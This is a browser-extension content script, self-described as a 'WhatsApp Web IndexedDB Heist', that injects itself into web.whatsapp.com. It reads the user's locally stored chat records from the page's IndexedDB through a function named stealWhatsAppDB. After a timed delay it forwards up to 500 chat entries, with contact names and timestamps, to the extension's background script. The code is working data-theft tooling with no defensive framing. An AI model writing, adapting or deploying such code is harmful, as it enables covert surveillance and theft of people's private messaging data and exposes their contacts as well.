/**
 * PICS Omni-Extractor: WhatsApp Web IndexedDB Heist
 * Injected into web.whatsapp.com
 * Extracts bulk historical messages directly from local database without UI scraping.
 */

console.log("[PICS Omni-Extractor] WhatsApp Content Script Injected");

// WhatsApp stores its entire message history in an IndexedDB database called "model-storage"
const DB_NAME = "model-storage";
const STORE_NAME = "chat"; // or "message"

async function stealWhatsAppDB() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(DB_NAME);

    request.onerror = (event) => {
      console.error("[PICS] Failed to open WhatsApp DB", event);
      reject("DB Open Failed");
    };

    request.onsuccess = (event) => {
      const db = event.target.result;
      
      // Check if the store exists
      if (!db.objectStoreNames.contains(STORE_NAME)) {
        db.close();
        resolve({ chats: [], note: "Store not found, possibly unauthenticated" });
        return;
      }

      const transaction = db.transaction([STORE_NAME], "readonly");
      const store = transaction.objectStore(STORE_NAME);
      const getAllRequest = store.getAll();

      getAllRequest.onsuccess = () => {
        const data = getAllRequest.result;
        db.close();
        resolve(data);
      };

      getAllRequest.onerror = () => {
        db.close();
        reject("Store read failed");
      };
    };
  });
}

// Wait for load, then extract
setTimeout(async () => {
  try {
    console.log("[PICS] Attempting WhatsApp DB extraction...");
    const chats = await stealWhatsAppDB();
    
    if (chats && chats.length > 0) {
      console.log(`[PICS] Extracted ${chats.length} chats from IndexedDB! Sending to background...`);
      
      // Filter out massive binary blobs or avatars to keep payload light
      const leanChats = chats.map(c => ({
        id: c.id,
        name: c.name,
        unreadCount: c.unreadCount,
        t: c.t, // timestamp
      })).slice(0, 500); // Send top 500 for now

      chrome.runtime.sendMessage({
        type: "PICS_WHATSAPP_DUMP",
        payload: { chats: leanChats }
      });
    } else {
      console.log("[PICS] DB is empty or unauthenticated.");
    }
  } catch (err) {
    console.error("[PICS] Extraction error:", err);
  }
}, 10000); // 10s delay to ensure WhatsApp finishes loading
